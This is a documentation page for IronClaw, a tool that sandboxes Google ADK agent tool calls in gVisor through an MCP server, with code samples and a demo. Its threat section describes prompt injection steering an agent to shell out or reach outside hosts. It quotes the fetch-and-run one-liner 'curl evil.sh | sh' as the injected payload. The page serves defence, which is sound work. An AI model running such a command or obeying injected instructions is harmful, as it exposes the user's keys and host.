---
title: "Sandbox your Google ADK agent with IronClaw"
description: How to sandbox a Google Agent Development Kit (ADK) agent. Route your ADK tool calls through IronClaw's MCP server with MCPToolset so model-chosen code runs inside a sealed gVisor sandbox instead of your host, key held host-side and every call gated, plus a credential-free demo you can run first.
---

# Sandbox your Google ADK agent with IronClaw

You built an agent with the **[Google Agent Development Kit](https://google.github.io/adk-docs/)**
(ADK): an `LlmAgent`, a model, and a set of tools the model can call. ADK designs
the *behavior* well. The risk starts when it runs somewhere real. An ADK tool runs
**in your own process**, with your API key in the environment and unrestricted
outbound network. One prompt-injected instruction and that same process can read
your environment, shell out, or reach any host on the internet.

IronClaw runs the model-chosen work behind a **sealed sandbox** instead: no network
card, the model key held **host-side** and never in the tool, and every call routed
through a human-approval gateway and an audit log. ADK speaks
[MCP](https://modelcontextprotocol.io) through `MCPToolset`, so the wiring is a few
lines.

!!! example "Runnable example"
    A one-command Google ADK to IronClaw example lives at
    [`examples/integrations/google-adk`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/google-adk):
    an ADK agent whose code execution is backed by an IronClaw sandbox, with a
    blocked escape attempt printed at the end. The credential-free demo below runs
    the same sealed loop today.

## The fix: run tools in IronClaw, not your process

IronClaw ships an MCP server that exposes a single, blunt tool, **`sandbox_exec`**,
which runs any command inside an ephemeral, hardened box under **gVisor (runsc)**:
no network card, every Linux capability dropped, a non-root user, a read-only root
filesystem, and a restrictive seccomp profile. ADK loads it with `MCPToolset`:

```python
from google.adk.agents import LlmAgent
from google.adk.tools.mcp_tool.mcp_toolset import MCPToolset, StdioServerParameters

toolset = MCPToolset(
    connection_params=StdioServerParameters(command="ironctl", args=["mcp", "serve"]),
)

agent = LlmAgent(
    model="gemini-2.0-flash",
    name="incident_reporter",
    instruction="Analyze the log file and summarize the errors.",
    tools=[toolset],          # exposes sandbox_exec to the model
)
```

The model still decides *what* to run. It just can no longer run it on your box: the
command lands inside the sealed sandbox, and a prompt injection that says
`curl evil.sh | sh` executes with no network card and nothing to steal.

!!! warning "gVisor (runsc) is the boundary"
    `ironctl mcp serve` passes `--runtime runsc` by default and **fails closed** if
    runsc is not installed rather than silently downgrading. Install gVisor from
    [gvisor.dev](https://gvisor.dev/docs/user_guide/install/). See
    [Run IronClaw as an MCP server](mcp-server.md) for HTTP transport and auth.

## Why sandbox this

A typical ADK tool:

```python
import subprocess
from google.adk.agents import LlmAgent

def run_shell(cmd: str) -> str:
    """Run a shell command."""
    return subprocess.check_output(cmd, shell=True, text=True)   # runs on YOUR host

agent = LlmAgent(model="gemini-2.0-flash", name="ops", tools=[run_shell])
```

Three things are true of that tool, and all three are risks:

1. **The key is in the process.** Anything that reads the environment reads it.
2. **The tool runs with your privileges.** `subprocess` executes on your box, with
   your filesystem and network.
3. **Egress is wide open.** The process can reach any host on the internet.

Routing the same call through `sandbox_exec` closes all three by construction, not
by convention.

## See it work first (no credentials)

Before wiring anything, watch the sealed loop run with the offline `mock` provider.
No model key, no tokens, just Docker:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from google adk"}'
```

You get a sealed agent loop with a human-approval gateway and an append-only audit
log, before you point a single real key at it.

## Next steps

- [Run IronClaw as an MCP server](mcp-server.md) - full transport, auth, and
  containment-status detail for any MCP client.
- [Sandbox your smolagents agent](smolagents.md) - the same MCP wiring for Hugging
  Face smolagents.
- [Isolation, proven](../security-isolation.md) - how the sandbox holds under a real
  escape attempt.
